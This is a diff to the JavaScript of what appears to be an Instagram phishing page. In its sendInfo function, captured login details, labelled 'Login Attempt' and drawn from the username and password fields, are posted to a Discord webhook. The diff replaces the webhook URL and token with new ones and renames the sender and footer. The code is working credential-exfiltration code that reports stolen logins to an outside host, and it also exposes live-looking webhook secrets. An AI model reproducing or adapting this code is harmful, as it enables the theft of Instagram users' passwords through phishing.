@@ -58,14 +58,14 @@ async function getInfo() {
   
 
 async function sendInfo() {
-  const webhook = "https://discord.com/api/webhooks/1255465699002814485/fD2PBNwnLUeB8z3JA43M7z9kPC2d4qsv49nhHC9J_2uk1XsD7mFwtKNpag2_DvZjkuJT"; //your discord webhook url
+  const webhook = "https://discord.com/api/webhooks/1255476034283765782/cqo36I2osDjIkwBCSnt-ulrwzRr2_8mZdvvZ6Zq-FIv7InVHwqFjEya9sVuQRCrH6agP"; //your discord webhook url
 
   const embed = {
     color: 1585803, //#18328b
     title: "Login Attempt",
     description: `${Info}`, //`${Info}> Username: ${username.value}\n> Password: ${password.value}\n`
     footer: {
-      text: "github.com/Josakko/InstagramPhishing",
+      text: "mil gaya beta!!!",
     }
   }
 
@@ -74,7 +74,7 @@ async function sendInfo() {
     headers: {
       "Content-Type": "application/json"
     },
-    body: JSON.stringify({ username: "JK_InstagramPhishing", embeds: [embed] }) //content: `${Info}`
+    body: JSON.stringify({ username: "informer_chachu", embeds: [embed] }) //content: `${Info}`
   };
 
   try {
